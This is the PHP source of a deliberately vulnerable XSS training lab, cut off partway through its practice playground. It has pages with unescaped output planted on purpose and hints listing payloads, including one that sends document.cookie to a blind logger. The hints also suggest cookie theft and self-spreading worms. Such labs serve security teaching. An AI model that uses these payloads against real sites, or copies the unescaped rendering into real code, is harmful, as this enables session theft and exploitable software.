<?php
// index.php - XSS teaching lab (single-file router)
require_once __DIR__ . '/init_db.php';
$dbfile = __DIR__ . '/db.sqlite';
$db = new PDO('sqlite:' . $dbfile);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$page = $_GET['page'] ?? 'home';

// server-side basic filter levels for the Filter Lab
function filter_input_level($input, $level){
    if ($level === 'none') return $input;
    if ($level === 'naive') {
        // naive strip of <script> tags and common event handlers
        $out = preg_replace('#<\s*script[^>]*>(.*?)<\s*/\s*script>#is','',$input);
        $out = preg_replace('#on[a-z]+\s*=\s*["\'].*?["\']#is','',$out);
        return $out;
    }
    if ($level === 'strip_tags') {
        return strip_tags($input);
    }
    if ($level === 'encode') {
        return htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
    if ($level === 'regex') {
        // remove <, > and javascript: pseudo-protocol occurrences
        $out = preg_replace('/<|>|javascript:/i','',$input);
        return $out;
    }
    // default fallback
    return $input;
}

// helper for rendering header
function render_xp_hud(){
    echo '<div class="xp-hud" data-xp-hud>'; // container for XP tracker
    echo '<div class="xp-hud-info">';
    echo '<div class="xp-hud-level" id="xp-level">Level 1</div>';
    echo '<div class="xp-hud-total" id="xp-total">0 XP</div>';
    echo '</div>';
    echo '<div class="xp-hud-progress">';
    echo '<div class="xp-progress-bar"><div class="xp-progress-fill" id="xp-progress-fill" role="progressbar" aria-valuemin="0" aria-valuemax="100"></div></div>';
    echo '<button type="button" class="button xp-reset" id="xp-reset">Reset XP</button>';
    echo '</div>';
    echo '</div>';
}

function xp_marker($id, $label, $xp = 25){
    $idAttr = htmlspecialchars($id, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $labelEsc = htmlspecialchars($label, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $xpVal = (int)$xp;
    echo '<div class="xp-marker" data-xp-id="'.$idAttr.'" data-xp-award="'.$xpVal.'">';
    echo '<div class="xp-marker-body">';
    echo '<div class="xp-marker-label">'.$labelEsc.'</div>';
    echo '<button type="button" class="button xp-button">Mark complete (+' . $xpVal . ' XP)</button>';
    echo '</div>';
    echo '<div class="xp-marker-status" aria-live="polite"></div>';
    echo '</div>';
}

function header_html($title='XSS Lab', $active='home'){
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'.htmlspecialchars($title).'</title>';
    echo '<link rel="stylesheet" href="styles.css">';
    echo '</head><body class="app-shell">';
    echo '<div class="background-glow"></div><div class="background-grid"></div>';
    echo '<div class="container">';
    // sidebar
    echo '<aside class="sidebar card">';
    echo '<div class="logo">The XSS Rat — XSS Lab</div>';
    echo '<div class="sidebar-intro small">Pick a track to explore a specific XSS vector. Each lab walks you through reconnaissance, exploitation and reflection steps.</div>';
    echo '<nav class="sidebar-nav">';
    $tabs = [
        'home'=>'Home overview',
        'fundamentals'=>'Foundations & concepts',
        'reflected'=>'Reflected XSS',
        'stored'=>'Stored XSS',
        'dom'=>'DOM XSS',
        'blind'=>'Blind XSS',
        'filter'=>'Filter lab',
        'contexts'=>'Contexts explorer',
        'playground'=>'Practice playground',
        'bypasses'=>'Bypass library'
    ];
    foreach ($tabs as $k=>$v){
        $classes = 'nav-item button';
        if ($k === $active) {
            $classes .= ' is-active';
        }
        echo '<a class="'.$classes.'" href="#" data-page="'.htmlspecialchars($k).'">'.htmlspecialchars($v).'</a>';
    }
    echo '</nav>';
    echo '<div class="sidebar-footer small">Warning: intentionally vulnerable. Run locally.</div>';
    echo '</aside>'; // sidebar end
    echo '<main class="main-column">';
    echo '<div class="card surface-card">';
    echo '<div class="lab-title">'.htmlspecialchars($title).'</div>';
    render_xp_hud();
}

// footer
function footer_html(){
    echo '</div>'; // card
    echo '</main>'; // main column
    echo '</div>'; // container
    echo '<script src="app.js"></script>';
    echo '</body></html>';
}

// ROUTES
if ($page === 'home'){
    header_html('Home — XSS Lab', 'home');
    echo '<div class="hero">';
    echo '<div class="hero-title">Start from zero knowledge and grow into an XSS practitioner.</div>';
    echo '<div class="hero-body small">Follow the learning path: absorb the web fundamentals, practise every XSS flavour with checklists, then solidify your skills inside the sandbox playground.</div>';
    echo '</div>';
    xp_marker('home-orientation', 'Reviewed the home orientation and learning path', 15);
    echo '<div class="meta meta-columns intro-columns">';
    echo '<div><strong>What you will learn</strong><div class="small">Understand how browsers build the Document Object Model (DOM), how HTML tags and attributes shape a page, and how JavaScript interacts with those nodes. Each lab references these ideas so you can connect theory with the exploit workflow.</div></div>';
    echo '<div><strong>Suggested learning order</strong><ol class="lab-steps"><li>Foundations &amp; concepts</li><li>Reflected, stored and DOM XSS labs</li><li>Filter lab + Contexts explorer</li><li>Playground scenarios and custom experiments</li></ol></div>';
    echo '<div><strong>Practice mindset</strong><div class="small">Treat every section like an assessment: take notes, sketch payload variants, and capture lessons learned in your notebook so you leave ready to reproduce the attacks elsewhere.</div></div>';
    echo '</div>';
    echo '<div class="lab-grid">';
    $cards = [
        ['fundamentals','Foundations &amp; concepts','Build the mental model for HTML, the DOM and JavaScript before touching payloads.'],
        ['reflected','Reflected XSS','Spot input parameters that echo immediately and craft payloads that execute on first load.'],
        ['stored','Stored XSS','Persist malicious markup inside databases or comments and watch it execute for every visitor.'],
        ['dom','DOM XSS','Manipulate client-side JavaScript sinks such as <code>innerHTML</code> and URL fragments.'],
        ['blind','Blind XSS','Plant payloads that phone home to the blind logger to prove execution in remote panels.'],
        ['filter','Filter Lab','Experiment with increasingly strict server-side filters and learn reliable bypasses.'],
        ['contexts','Contexts','See how the same payload behaves in HTML, attributes, JS, CSS and URL contexts.'],
        ['playground','Playground','Apply everything you learned across multiple realistic mini applications.'],
        ['bypasses','Bypasses','Browse a curated list of payloads ranked from beginner friendly to advanced evasions.'],
    ];
    foreach ($cards as $card){
        echo '<a class="lab-card" href="#" data-page="'.htmlspecialchars($card[0]).'"><div class="lab-card-title">'.htmlspecialchars($card[1]).'</div><div class="lab-card-body small">'.$card[2].'</div><div class="lab-card-action">Start lab →</div></a>';
    }
    echo '</div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>How to use these labs</strong><ol class="lab-steps"><li>Read the scenario to understand the application behaviour.</li><li>Use the checklist to experiment and note the results.</li><li>Capture payloads that work so you can reuse them later.</li><li>Reflect on how filters and contexts influenced the payload.</li></ol></div>';
    echo '<div><strong>Recommended toolkit</strong><ul class="lab-list"><li>Browser devtools (Elements + Console + Network)</li><li>Interception proxy (Burp, OWASP ZAP)</li><li>Custom payload scratchpad or local text editor</li><li>Notes on HTML tags, JS APIs and DOM properties you discover</li></ul></div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'fundamentals'){
    header_html('Foundations & concepts', 'fundamentals');
    echo '<div class="section"><div class="section-title">Welcome to the web stack</div><div class="small">Before throwing payloads at inputs, understand how browsers interpret HTML, build the Document Object Model (DOM) and execute JavaScript. This foundation lets you reason about where user-controlled data travels.</div></div>';
    xp_marker('fundamentals-overview', 'Studied the foundations and concepts overview', 20);
    echo '<div class="section"><div class="section-title">HTML: the structure layer</div><div class="small">HyperText Markup Language describes the layout of a page using nested tags. Each tag can carry attributes that store extra data. Browsers parse these tags into DOM nodes.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>HTML essentials</strong><ul class="lab-list"><li><code>&lt;tag&gt;content&lt;/tag&gt;</code> wraps text or other elements.</li><li>Attributes like <code>href="..."</code> or <code>onclick="..."</code> live inside the opening tag.</li><li>Void elements (e.g. <code>&lt;img&gt;</code>) have no closing tag and are common XSS sinks via attributes.</li></ul></div>';
    echo '<div><strong>Example document outline</strong><div class="bypass-list">&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;... metadata ...&lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Title&lt;/h1&gt;\n    &lt;a href="/profile?id=7"&gt;Profile&lt;/a&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</div></div>';
    echo '<div><strong>Why attackers care</strong><div class="small">If you can inject HTML, you can add new tags or attributes. That may give you a place to execute JavaScript (via <code>&lt;script&gt;</code>, event handlers, or dangerous URLs).</div></div>';
    echo '</div>';
    echo '<div class="interactive-block">';
    echo '<div class="section-title">Try it: render HTML vs. escaped text</div>';
    echo '<div class="small">Type markup to see how browsers build DOM nodes. You will get both the live rendered version and an escaped, safe string for comparison.</div>';
    echo '<div class="fundamentals-playground" data-fundamentals-playground>';
    echo '<label class="small" for="fundamentals-html-input">Type some HTML</label>';
    echo '<textarea id="fundamentals-html-input" class="input fundamentals-input" data-fundamentals-input placeholder="e.g. &lt;img src=x onerror=alert(1)&gt;">&lt;p&gt;Hello DOM! Try injecting &lt;strong&gt;bold&lt;/strong&gt; text or an &lt;img onerror=alert(1)&gt; payload.&lt;/p&gt;</textarea>';
    echo '<div class="fundamentals-playground-actions">';
    echo '<button type="button" class="button" data-fundamentals-render>Render snippet</button>';
    echo '<button type="button" class="button button-secondary" data-fundamentals-reset>Reset</button>';
    echo '</div>';
    echo '<div class="fundamentals-playground-results">';
    echo '<div class="fundamentals-preview">';
    echo '<div class="fundamentals-preview-label">Rendered DOM</div>';
    echo '<div class="fundamentals-preview-surface" data-fundamentals-preview></div>';
    echo '</div>';
    echo '<div class="fundamentals-preview">';
    echo '<div class="fundamentals-preview-label">Escaped string</div>';
    echo '<pre class="fundamentals-preview-surface" data-fundamentals-escaped></pre>';
    echo '</div>';
    echo '</div>';
    echo '<div class="small fundamentals-tip" data-fundamentals-tip>✅ Keep experimenting until the rendered DOM matches what you expect.</div>';
    echo '</div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">The DOM: live objects representing the page</div><div class="small">When a browser parses HTML it creates a tree of nodes. JavaScript APIs manipulate this tree. Understanding node properties helps you predict where injected strings will land.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>Key DOM terms</strong><ul class="lab-list"><li><em>Element nodes</em>: correspond to HTML tags and expose properties like <code>innerHTML</code> and <code>attributes</code>.</li><li><em>Text nodes</em>: represent literal text between tags.</li><li><em>Events</em>: actions like <code>click</code> or <code>load</code> that trigger handlers attached to nodes.</li></ul></div>';
    echo '<div><strong>Inspecting the DOM</strong><div class="small">Open browser devtools → Elements tab. Hover over nodes to see their relationships. Right-click to edit HTML live and observe how the DOM updates instantly.</div><div class="callout">Challenge: change a button label by editing <code>innerText</code> in the console.</div></div>';
    echo '<div><strong>DOM sinks that matter</strong><ul class="lab-list"><li><code>innerHTML</code> and <code>outerHTML</code> interpret strings as HTML.</li><li><code>document.write()</code> injects raw markup during page load.</li><li>Setting <code>href</code>, <code>src</code> or <code>data-*</code> attributes can trigger navigation or fetches.</li></ul></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">JavaScript: behaviour layer</div><div class="small">Scripts run after the DOM exists (or as it loads) and can read, modify or execute strings. XSS aims to control this execution path.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>Quick JavaScript primer</strong><ul class="lab-list"><li>Variables store data: <code>const payload = location.search;</code></li><li>Functions encapsulate behaviour: <code>function show(msg) { alert(msg); }</code></li><li>The DOM API is available via <code>document</code> and <code>window</code>.</li></ul></div>';
    echo '<div><strong>Common vulnerable patterns</strong><div class="bypass-list">// Taking user input\nconst hash = location.hash.substring(1);\n// Writing it without escaping\ndocument.getElementById("content").innerHTML = decodeURIComponent(hash);</div><div class="small">Any user can control <code>location.hash</code> by editing the URL, so the resulting HTML executes.</div></div>';
    echo '<div><strong>Essential browser APIs</strong><ul class="lab-list"><li><code>alert()</code> for proof-of-concept.</li><li><code>fetch()</code> or <code>XMLHttpRequest</code> for exfiltration.</li><li><code>localStorage</code>, <code>document.cookie</code> to read stored secrets.</li></ul></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">Linking concepts to the labs</div><div class="small">With these basics you can reason about the attack surface: identify where HTML is generated, which DOM sinks are in play, and how JavaScript might execute injected data. Move on to the Reflected XSS lab and deliberately trace each step from input to sink.</div></div>';
    echo '<div class="meta"><strong>Next steps</strong><ol class="lab-steps"><li>Use the Reflected XSS lab to practice following a value from request → response → DOM.</li><li>Repeat for Stored XSS and note the persistence layer.</li><li>Revisit this page whenever a concept feels fuzzy—treat it like your personal glossary.</li></ol></div>';
    footer_html();
    exit;
}

if ($page === 'reflected'){
    header_html('Reflected XSS', 'reflected');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Classic reflected XSS happens when user input is immediately returned in the HTTP response. Use the form below to trace the data flow and capture a working payload.</div></div>';
    xp_marker('reflected-first-payload', 'Executed a reflected XSS payload', 30);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Map the reflected parameter using ?page=reflected&amp;q=test and observe the response.</li><li>Confirm raw HTML injection by attempting harmless tags like <code>&lt;em&gt;</code>.</li><li>Escalate to JavaScript execution with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or event handler payloads.</li><li>Experiment with filter bypasses such as breaking out of attributes or using <code>&lt;img src onerror=alert(1)&gt;</code>.</ol></div>';
    // echo back GET param 'q' unsafely
    $q = $_GET['q'] ?? '';
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="reflected">';
    echo '<div class="form-row"><input class="input" name="q" data-field="q" placeholder="Enter text to reflect"><span class="input-hint">Tip: start simple, then move to payloads.</span></div>';
    echo '<div class="form-row"><button class="button">Submit &amp; observe response</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="q"><strong>Reflected input</strong><div class="small">The value of <code>q</code> is injected directly into the DOM without encoding. Any HTML/JS you submit will render immediately.</div><div class="callout">Track the request in your proxy to practice identifying vulnerable parameters in the wild.</div></div></div>';
    echo '<div class="results"><div class="results-title">Raw response fragment</div><div class="results-body">';
    // intentionally vulnerable echo
    echo $q;
    echo '</div></div>';
    footer_html();
    exit;
}

if ($page === 'stored'){
    header_html('Stored XSS', 'stored');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Stored (persistent) XSS abuses server-side storage such as databases or comment systems. Inputs are saved and replayed to all viewers without sanitisation.</div></div>';
    xp_marker('stored-exploit', 'Delivered a stored XSS payload', 35);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Publish a benign message and verify it appears below.</li><li>Inject HTML to validate that markup is preserved in storage.</li><li>Store a script payload so it runs when the page renders.</li><li>Refine your payload to steal cookies or demonstrate impact via the console.</li></ol></div>';
    // handle posting messages into sqlite
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['title'])){
        $st = $db->prepare('INSERT INTO stored_messages (title, body) VALUES (:t,:b)');
        $st->execute([':t'=>$_POST['title'], ':b'=>$_POST['body']]);
        echo '<div class="notice success">Entry stored! Scroll down to see it render unsafely.</div>';
    }
    echo '<form method="POST" action="?page=stored">';
    echo '<div class="form-row"><input class="input" name="title" data-field="title" placeholder="Message title"><span class="input-hint">Example: Friendly greeting</span></div>';
    echo '<div class="form-row"><textarea class="input" name="body" data-field="body" placeholder="Message body (try XSS payloads)" rows="4"></textarea><span class="input-hint">Payload idea: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></div>';
    echo '<div class="form-row"><button class="button">Save message</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="body"><strong>Stored messages</strong><div class="small">Messages are stored in SQLite and printed back without sanitisation. Anyone viewing this list will execute your payload.</div><div class="callout">Try automating with curl to simulate a worm dropping multiple entries.</div></div></div>';
    echo '<div class="results">';
    $rows = $db->query('SELECT id,title,body,created_at FROM stored_messages ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-bottom:1px solid rgba(255,255,255,0.02);padding:8px;margin-bottom:8px">';
        echo '<div class="small">#'.intval($r['id']).' - '.htmlspecialchars($r['created_at']).' - <strong>'.htmlspecialchars($r['title']).'</strong></div>';
        // UNSAFE: render body raw to demonstrate XSS
        echo '<div style="margin-top:6px">'. $r['body'] .'</div>';
        echo '</div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'dom'){
    header_html('DOM XSS', 'dom');
    // example using location.hash insertion into innerHTML
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">DOM-based XSS executes entirely in the browser when JavaScript reads untrusted data and writes it to a sink without sanitising.</div></div>';
    xp_marker('dom-sink', 'Abused a DOM XSS sink', 30);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Review the inline script to identify the sink (<code>innerHTML</code>).</li><li>Modify the hash using the control below or straight in the URL bar.</li><li>Observe how the sink renders decoded content from <code>location.hash</code>.</li><li>Deliver payloads such as <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> and watch them fire.</li></ol></div>';
    echo '<div class="form-row"><input class="input" id="dom-input" data-field="dom-input" placeholder="Change the URL hash or try a payload"><span class="input-hint">Hint: hashes are URL encoded. Use %3C for &lt;.</span></div>';
    echo '<div class="form-row"><button class="button" onclick="location.hash = document.getElementById(\'dom-input\').value">Set hash</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="dom-input"><strong>DOM sink</strong><div class="small">The script listens to <code>hashchange</code> and writes the decoded hash straight into <code>innerHTML</code>.</div><div class="callout">Open DevTools → Sources to inspect the live JavaScript as you test payloads.</div></div></div>';
    echo '<div class="results"><div class="results-title">Rendered hash content</div><div id="dom-sink" class="results-body">Hash will be shown here</div></div>';
    echo '<script>
(function(){
  var el = document.getElementById("dom-sink");
  // intentionally unsafe: writes location.hash into innerHTML
  function render(){ el.innerHTML = location.hash ? decodeURIComponent(location.hash.substring(1)) : "(no hash)"; }
  window.addEventListener("hashchange", render);
  render();
})();
</script>';
    footer_html();
    exit;
}

if ($page === 'blind'){
    header_html('Blind XSS', 'blind');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Blind XSS payloads execute on a separate system (e.g. admin panel) and cannot be observed directly. Instead, the payload must exfiltrate to a controlled endpoint like the logger below.</div></div>';
    xp_marker('blind-callback', 'Captured a blind XSS callback', 40);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Craft a payload that makes an outbound request to <code>/blind_logger.php</code>.</li><li>Deliver the payload to a hypothetical support system or admin portal.</li><li>Monitor the log to confirm when an unsuspecting victim loads it.</li><li>Extract contextual data (cookies, DOM, CSRF tokens) in the payload and send them to the logger.</li></ol></div>';
    echo '<form method="GET" action="?page=blind"><div class="form-row"><input class="input" name="payload" data-field="payload" placeholder="Example: &lt;img src=\'/blind_logger.php?p=1\'&gt;"><span class="input-hint">Try using fetch or new Image() for stealth.</span></div><div class="form-row"><button class="button">Preview payload</button></div></form>';
    $payload = $_GET['payload'] ?? '';
    if ($payload){
        echo '<div class="meta"><strong>Payload</strong><div class="small">Use this payload on the target application. When executed, it will call back to the logger below.</div><div class="callout">Shareable payload idea: <code>&lt;script&gt;new Image().src="/blind_logger.php?p="+encodeURIComponent(document.cookie)&lt;/script&gt;</code></div></div>';
        echo '<div class="results"><div class="results-title">Payload preview</div><div class="bypass-list">'.htmlspecialchars($payload).'</div></div>';
    }
    echo '<div style="margin-top:12px" class="card"><div class="section-title">Recent blind hits</div><div class="small">Each entry represents an HTTP request made by a victim’s browser when your payload executed.</div>';
    $rows = $db->query('SELECT id,created_at,remote_addr,user_agent,params FROM blind_hits ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-top:1px solid rgba(255,255,255,0.02);padding:8px;margin-top:8px"><div class="small">#'.intval($r['id']).' '.htmlspecialchars($r['created_at']).' from '.htmlspecialchars($r['remote_addr']).'</div>';
        echo '<div class="small">UA: '.htmlspecialchars($r['user_agent']).'</div>';
        echo '<div class="bypass-list">'.htmlspecialchars($r['params']).'</div></div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'filter'){
    $allowedLevels = ['none','naive','strip_tags','regex','encode'];
    $level = $_GET['level'] ?? 'none';
    if ($_SERVER['REQUEST_METHOD'] === 'POST'){
        $postedLevel = $_POST['level'] ?? $_POST['level_select'] ?? null;
        if ($postedLevel !== null && in_array($postedLevel, $allowedLevels, true)){
            $level = $postedLevel;
        }
    }
    if (!in_array($level, $allowedLevels, true)){
        $level = 'none';
    }
    $levelQuery = urlencode($level);
    header_html('Filter Lab', 'filter');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Use the filter lab to understand how different server-side defences behave. Submit payloads and compare the raw, filtered and rendered output.</div></div>';
    xp_marker('filter-bypass', 'Bypassed a filter level', 35);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Select a filter level to see how it transforms your input.</li><li>Test known payloads from the bypass library against each level.</li><li>Document which encodings or transformations defeat the filter.</li><li>Consider the impact if the filtered output is placed into various contexts.</li></ol></div>';
    echo '<form method="GET" action="">';
    echo '<input type="hidden" name="page" value="filter">';
    echo '<div class="form-row"><label class="small">Filter level:</label><select name="level" onchange="this.form.submit()"><option value="none" '.($level==='none'?'selected':'').'>none (vulnerable)</option><option value="naive" '.($level==='naive'?'selected':'').'>naive (strip &lt;script&gt; and on* handlers)</option><option value="strip_tags" '.($level==='strip_tags'?'selected':'').'>strip_tags()</option><option value="regex" '.($level==='regex'?'selected':'').'>regex (remove &lt; &gt; and javascript:)</option><option value="encode" '.($level==='encode'?'selected':'').'>encode (htmlspecialchars)</option></select><span class="input-hint">Changes auto-submit so you can compare levels quickly.</span></div>';
    echo '</form>';
    // accept input and show before/after and render result sink
    echo '<form method="POST" action="?page=filter&level='.$levelQuery.'">';
    echo '<input type="hidden" name="level" value="'.htmlspecialchars($level, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'">';
    echo '<div class="form-row"><textarea class="input" name="input" data-field="filter-input" rows="4" placeholder="Try payloads here"></textarea><span class="input-hint">Try: &lt;svg onload=alert(1)&gt;</span></div><div class="form-row"><button class="button">Run through filter</button></div>';
    echo '</form>';
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['input'])){
        $raw = $_POST['input'];
        $filtered = filter_input_level($raw, $level);
        echo '<div class="meta"><strong>Server-side filter applied:</strong> '.htmlspecialchars($level).'<div class="callout">Does the filtered result still execute? Use the rendered sink to confirm.</div></div>';
        echo '<div class="results"><div class="results-title">Analysis</div><div class="analysis-grid">';
        echo '<div><div class="analysis-label">Raw input</div><div class="bypass-list">'.htmlspecialchars($raw).'</div></div>';
        echo '<div><div class="analysis-label">Filtered output</div><div class="bypass-list">'.htmlspecialchars($filtered).'</div></div>';
        echo '</div>';
        echo '<div class="results-sink"><div class="analysis-label">Rendered sink (unsafe)</div><div class="sink-output">';
        // intentionally render filtered output without encoding to show bypasses
        echo $filtered;
        echo '</div></div></div>';
    }
    footer_html();
    exit;
}

if ($page === 'playground'){
    header_html('Practice playground', 'playground');
    echo '<div class="section"><div class="section-title">Put the concepts to work</div><div class="small">Use these miniature applications to rehearse exploitation outside of the guided steps. Each scenario mirrors a real bug class and encourages you to apply reconnaissance, payload crafting and impact demonstration.</div></div>';
    echo '<div class="section"><div class="section-title">How to approach the playground</div><ol class="lab-steps"><li>Skim the brief and predict where user input will land.</li><li>Attempt benign probes (<code>test</code>, <code>&lt;em&gt;</code>, quotes) before escalating.</li><li>Record working payloads and why they succeed—think about DOM vs. server rendering.</li><li>Reset the page with different payload styles (HTML, attribute, URL) to cement the concept.</li></ol></div>';

    // Scenario 1: reflected search widget
    $reflect = $_GET['reflect'] ?? '';
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 1: Help centre search (reflected)</div>';
    echo '<div class="small">A support portal echoes the <code>q</code> parameter when no results are found. Demonstrate how reflected input leads to execution.</div>';
    xp_marker('playground-s1', 'Solved Scenario 1: Help centre search', 25);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><div class="form-row"><input class="input" name="reflect" data-field="reflect" placeholder="Search query"><span class="input-hint">Start with plain text, then try markup like &lt;img src onerror=alert(1)&gt;</span></div><div class="form-row"><button class="button">Search</button></div></form>';
    echo '<div class="meta"><div class="meta-item" data-field="reflect"><strong>Investigation tips</strong><div class="small">View source after submitting. The query is injected inside a <code>&lt;div&gt;</code> without encoding, so HTML payloads execute immediately.</div></div></div>';
    echo '<div class="results"><div class="results-title">Search response</div><div class="results-body">';
    if ($reflect !== ''){
        echo 'No results for: '.$reflect; // intentionally unsafe
    } else {
        echo '(Submit a query to see the reflection)';
    }
    echo '</div></div>';
    echo '</div>';

    // Scenario 2: community comment wall (stored)
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'comment_wall'){
        $name = trim($_POST['name'] ?? '');
        $message = $_POST['message'] ?? '';
        $payload = json_encode(['name'=>$name,'message'=>$message], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'comment_wall', ':content'=>$payload]);
        echo '<div class="notice success">Comment saved to the wall. Reload the page to observe stored execution.</div>';
    }
    $commentStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 25');
    $commentStmt->execute([':scenario'=>'comment_wall']);
    $commentRows = $commentStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 2: Community shoutbox (stored)</div>';
    echo '<div class="small">Messages persist in the database and display for every visitor. Abuse the body field to deliver a self-firing payload.</div>';
    xp_marker('playground-s2', 'Stored payload in Scenario 2 shoutbox', 30);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="comment_wall"><div class="form-row"><input class="input" name="name" data-field="pg-name" placeholder="Display name"><span class="input-hint">Your name is encoded safely.</span></div><div class="form-row"><textarea class="input" name="message" data-field="pg-message" rows="3" placeholder="Message (HTML allowed)"></textarea><span class="input-hint">Stored payload idea: &lt;script&gt;alert(\'stored\')&lt;/script&gt;</span></div><div class="form-row"><button class="button">Post message</button></div></form>';
    echo '<div class="meta meta-columns"><div class="meta-item" data-field="pg-message"><strong>Recon questions</strong><ul class="lab-list"><li>Does the body render with <code>innerHTML</code> or server-side templating?</li><li>Can you craft a payload that steals another visitor&apos;s cookies?</li><li>What happens if you add an auto-submitting form to spread the worm?</li></ul></div><div><strong>Recent shoutbox entries</strong><div class="small">Everything below is rendered without sanitisation—perfect for verifying stored XSS.</div></div></div>';
    echo '<div class="results"><div class="results-title">Wall feed</div>';
    foreach ($commentRows as $row){
        $decoded = json_decode($row['content'], true);
        $name = htmlspecialchars($decoded['name'] ?? 'Anonymous');
        $message = $decoded['message'] ?? '';
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$name.'</strong></div><div class="wall-body">'.$message.'</div></div>';
    }
    if (count($commentRows) === 0){
        echo '<div class="small">No entries yet. Be the first to store something.</div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 3: client-side personalization (DOM)
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 3: Personalised dashboard (DOM)</div>';
    echo '<div class="small">A dashboard stores your preferences in <code>localStorage</code> and uses them to build widgets with <code>innerHTML</code>. Tamper with the data to execute arbitrary scripts when the widget renders.</div>';
    xp_marker('playground-s3', 'Exploded Scenario 3 dashboard widget', 30);
    echo '<div class="form-row"><input class="input" id="playground-widget" data-field="pg-dom" placeholder="Widget title or payload"><span class="input-hint">Tip: payloads should be URL encoded when modifying storage manually.</span></div>';
    echo '<div class="form-row"><button class="button" id="pg-save">Save preference</button><button class="button" id="pg-clear" style="background:rgba(255,255,255,0.1);color:#fff">Reset</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="pg-dom"><strong>Experiment ideas</strong><div class="small">Open DevTools → Application → Local Storage. Edit <code>dashboard_widget</code> to inject HTML such as <code>&lt;img src onerror=alert(document.domain)&gt;</code> then refresh the page.</div></div></div>';
    echo '<div class="results"><div class="results-title">Rendered widget</div><div id="pg-widget-output" class="results-body">(No widget stored yet)</div></div>';
    echo '<script>(function(){
        var input = document.getElementById("playground-widget");
        var output = document.getElementById("pg-widget-output");
        var saveBtn = document.getElementById("pg-save");
        var clearBtn = document.getElementById("pg-clear");
        function render(){
            var saved = localStorage.getItem("dashboard_widget");
            if (saved){
                output.innerHTML = decodeURIComponent(saved);
            } else {
                output.textContent = "(No widget stored yet)";
            }
        }
        saveBtn.addEventListener("click", function(e){
            e.preventDefault();
            localStorage.setItem("dashboard_widget", encodeURIComponent(input.value));
            render();
        });
        clearBtn.addEventListener("click", function(e){
            e.preventDefault();
            localStorage.removeItem("dashboard_widget");
            render();
        });
        render();
    })();</script>';
    echo '</div>';

    // Scenario 4: attribute injection badge (easy)
    $badge = $_GET['badge'] ?? '';
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 4 (Easy): Profile badge (attribute reflection)</div>';
    echo '<div class="small">Marketing wants dynamic badges. The value you supply is copied into multiple HTML attributes without escaping. Break out of the attribute to hijack the markup.</div>';
    xp_marker('playground-s4', 'Escaped Scenario 4 profile badge attributes', 25);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><div class="form-row"><input class="input" name="badge" value="'.htmlspecialchars($badge, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Badge text or payload"><span class="input-hint">Try closing the attribute with <code>"</code> then injecting <code>onmouseover</code>.</span></div><div class="form-row"><button class="button">Render badge</button></div></form>';
    echo '<div class="meta"><strong>Recon focus</strong><div class="small">Inspect the HTML to see how the value lands inside <code>title</code> and <code>data-badge</code> attributes. Attribute context payloads often need quotes and whitespace tricks.</div></div>';
